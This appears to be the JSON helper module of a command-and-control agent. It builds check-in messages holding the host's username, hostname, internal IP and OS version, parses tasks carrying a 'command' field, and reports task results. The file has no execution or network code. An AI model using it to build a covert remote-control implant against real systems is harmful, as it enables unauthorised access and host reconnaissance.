/*
 * json.c - Construction et parsing de JSON à la main
 */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include "json.h"

static void json_escape_string(const char* input, char* output, size_t output_size) {
    size_t i = 0;
    size_t j = 0;

    while (input[i] != '\0' && j < output_size - 2) {
        switch (input[i]) {
            case '"':
                if (j + 2 >= output_size) goto end;
                output[j++] = '\\';
                output[j++] = '"';
                break;
            case '\\':
                if (j + 2 >= output_size) goto end;
                output[j++] = '\\';
                output[j++] = '\\';
                break;
            case '\n':
                if (j + 2 >= output_size) goto end;
                output[j++] = '\\';
                output[j++] = 'n';
                break;
            case '\r':
                if (j + 2 >= output_size) goto end;
                output[j++] = '\\';
                output[j++] = 'r';
                break;
            case '\t':
                if (j + 2 >= output_size) goto end;
                output[j++] = '\\';
                output[j++] = 't';
                break;
            default:
                output[j++] = input[i];
                break;
        }
        i++;
    }

end:
    output[j] = '\0';
}

int json_build_checkin(const AgentInfo* info, char* output, size_t output_size) {
    if (info == NULL || output == NULL) {
        return 0;
    }

    int written = snprintf(output, output_size,
        "{"
        "\"agent_id\":\"%s\","
        "\"username\":\"%s\","
        "\"hostname\":\"%s\","
        "\"internal_ip\":\"%s\","
        "\"os_version\":\"%s\""
        "}",
        info->agent_id,
        info->username,
        info->hostname,
        info->internal_ip,
        info->os_version
    );

    return (written > 0 && (size_t)written < output_size) ? 1 : 0;
}

int json_build_result(const TaskResult* result, char* output, size_t output_size) {
    if (result == NULL || output == NULL) {
        return 0;
    }

    char escaped_result[LARGE_BUF];
    json_escape_string(result->result, escaped_result, sizeof(escaped_result));

    int written = snprintf(output, output_size,
        "{"
        "\"agent_id\":\"%s\","
        "\"task_id\":%d,"
        "\"result\":\"%s\","
        "\"success\":%s"
        "}",
        result->agent_id,
        result->task_id,
        escaped_result,
        result->success ? "true" : "false"
    );

    return (written > 0 && (size_t)written < output_size) ? 1 : 0;
}

int json_get_string(const char* json, const char* key, char* value, size_t value_size) {
    if (json == NULL || key == NULL || value == NULL) {
        return 0;
    }

    char pattern[128];
    snprintf(pattern, sizeof(pattern), "\"%s\":", key);

    const char* pos = strstr(json, pattern);
    if (pos == NULL) {
        value[0] = '\0';
        return 0;
    }

    pos += strlen(pattern);

    while (*pos == ' ' || *pos == '\t') {
        pos++;
    }

    if (strncmp(pos, "null", 4) == 0) {
        value[0] = '\0';
        return 0;
    }

    if (*pos != '"') {
        value[0] = '\0';
        return 0;
    }

    pos++;

    size_t i = 0;
    while (*pos != '\0' && i < value_size - 1) {
        if (*pos == '\\' && *(pos + 1) != '\0') {
            pos++;
            switch (*pos) {
                case 'n':  value[i++] = '\n'; break;
                case 'r':  value[i++] = '\r'; break;
                case 't':  value[i++] = '\t'; break;
                case '"':  value[i++] = '"';  break;
                case '\\': value[i++] = '\\'; break;
                default:   value[i++] = *pos; break;
            }
            pos++;
        } else if (*pos == '"') {
            break;
        } else {
            value[i++] = *pos++;
        }
    }

    value[i] = '\0';
    return 1;
}

int json_get_int(const char* json, const char* key, int* value) {
    if (json == NULL || key == NULL || value == NULL) {
        return 0;
    }

    char pattern[128];
    snprintf(pattern, sizeof(pattern), "\"%s\":", key);

    const char* pos = strstr(json, pattern);
    if (pos == NULL) {
        *value = -1;
        return 0;
    }

    pos += strlen(pattern);

    while (*pos == ' ' || *pos == '\t') {
        pos++;
    }

    if (strncmp(pos, "null", 4) == 0) {
        *value = -1;
        return 0;
    }

    *value = atoi(pos);
    return 1;
}

int json_parse_task(const char* json, TaskResponse* task) {
    if (json == NULL || task == NULL) {
        return 0;
    }

    task->task_id = -1;
    task->command[0] = '\0';

    if (!json_get_int(json, "task_id", &task->task_id)) {
        return 0;
    }

    if (!json_get_string(json, "command", task->command, sizeof(task->command))) {
        return 0;
    }

    if (task->task_id < 0 || task->command[0] == '\0') {
        return 0;
    }

    return 1;
}